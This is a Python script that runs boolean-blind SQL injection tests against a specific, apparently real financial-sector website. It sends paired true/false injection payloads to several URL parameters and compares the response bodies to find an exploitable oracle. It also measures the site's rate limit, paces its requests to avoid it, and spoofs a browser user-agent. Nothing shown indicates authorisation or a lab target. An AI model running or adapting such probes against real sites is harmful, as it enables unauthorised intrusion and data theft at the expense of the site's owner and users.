#!/usr/bin/env python3
"""W19b: rate-limit characterisation + true boolean-blind test with retries.

Any 429-vs-200 comparison is an artifact of our own request rate, not a
server-side oracle. Establish the rate budget first, then only compare
200-vs-200 bodies.
"""
import hashlib, json, re, sys, time, urllib.request, urllib.error, urllib.parse

UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
BASE = "https://www.infinitycapital.bh"
GAP = 2.0
OUT = open("/tmp/w19b_out.json", "w")


def get(url, timeout=25):
    req = urllib.request.Request(url, headers={"User-Agent": UA, "Accept": "*/*"})
    t0 = time.time()
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, dict(r.headers), r.read(), time.time() - t0
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read(), time.time() - t0
    except Exception as e:
        return 0, {}, str(e).encode(), time.time() - t0


def norm(b):
    s = b.decode("utf-8", "replace")
    s = re.sub(r"\d{10,}", "NUM", s)
    s = re.sub(r"<!--[\s\S]*?-->", "", s)
    return hashlib.md5(s.encode()).hexdigest()


def fetch200(url, tries=5):
    for _ in range(tries):
        st, h, b, dt = get(url)
        if st != 429:
            return st, len(b), norm(b), dt
        time.sleep(GAP * 3)
    return st, len(b), norm(b), dt


def boolean_cell(pt, pf, label):
    qt = urllib.parse.quote(pt, safe="=&/?'+")
    qf = urllib.parse.quote(pf, safe="=&/?'+")
    a = fetch200(BASE + qt)
    time.sleep(GAP)
    b = fetch200(BASE + qf)
    real = (a[0] == 200 and b[0] == 200)
    same = real and a[2] == b[2] and a[1] == b[1]
    print(f"{label}\n  T: {a[0]} len={a[1]} h={a[2][:12]} dt={a[3]:.2f}")
    print(f"  F: {b[0]} len={b[1]} h={b[2][:12]} dt={b[3]:.2f}")
    if not real:
        print("  -> rate-limited, INCONCLUSIVE")
    elif same:
        print("  -> IDENTICAL 200 bodies: NO boolean oracle")
    else:
        print("  -> DIFFERENTIAL 200 bodies: possible oracle")
    r = {"label": label, "true": str(a), "false": str(b),
         "conclusive": real, "identical": same}
    print(json.dumps(r), file=OUT); OUT.flush()
    return r


if __name__ == "__main__":
    print("== rate probe ==")
    for i in range(6):
        st, h, b, dt = get(BASE + "/")
        print(f"  req{i}: {st} {len(b)}B {dt:.2f}s")
        time.sleep(0.4)
    tests = [
        ("/?page=2' AND '1'='1", "/?page=2' AND '1'='2", "root.page.quoted"),
        ("/?page=2 AND 1=1-- -", "/?page=2 AND 1=2-- -", "root.page.numeric"),
        ("/?id=1 AND 1=1-- -", "/?id=1 AND 1=2-- -", "root.id"),
        ("/contact?cb=1 AND 1=1-- -", "/contact?cb=1 AND 1=2-- -", "contact.cb"),
        ("/contact?cb=1' AND '1'='1", "/contact?cb=1' AND '1'='2", "contact.cb.quoted"),
    ]
    for pt, pf, lbl in tests:
        boolean_cell(pt, pf, lbl)
        time.sleep(GAP)
